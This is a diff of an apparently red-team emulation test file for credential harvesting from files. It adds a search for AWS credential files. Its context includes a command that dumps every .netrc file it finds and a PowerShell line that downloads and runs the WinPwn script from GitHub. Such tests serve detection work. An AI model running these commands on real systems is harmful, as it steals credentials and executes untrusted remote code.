@@ -1,6 +1,22 @@
 attack_technique: T1552.001
 display_name: 'Unsecured Credentials: Credentials In Files'
 atomic_tests:
+- name: Find AWS credentials
+  auto_generated_guid: 2b93758e-a8d7-4e3b-bc7b-d3aa8d7ecb17
+  description: |
+    Find local AWS credentials from file, defaults to using / as the look path.
+  supported_platforms:
+  - macos
+  - linux
+  input_arguments:
+    file_path:
+      description: Path to search
+      type: string
+      default: /
+  executor:
+    command: |
+      find #{file_path} -name "credentials" -type f -path "*/.aws/*" 2>/dev/null
+    name: sh
 - name: Extract Browser and System credentials with LaZagne
   auto_generated_guid: 9e507bb8-1d30-4e3b-a49b-cb5727d7ea79
   description: |
@@ -22,7 +38,7 @@ atomic_tests:
   input_arguments:
     file_path:
       description: Path to search
-      type: String
+      type: string
       default: /
   executor:
     command: |
@@ -59,13 +75,13 @@ atomic_tests:
     This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.
 
   supported_platforms:
-    - macos
-    - linux
+  - macos
+  - linux
 
   executor:
     name: bash
     elevation_required: false # Indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false.
-    command: | 
+    command: |
       for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done 
 - name: WinPwn - sensitivefiles
   auto_generated_guid: 114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0
@@ -140,5 +156,4 @@ atomic_tests:
       $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       SharpCloud -consoleoutput -noninteractive  
-    name: powershell   
-   
+    name: powershell
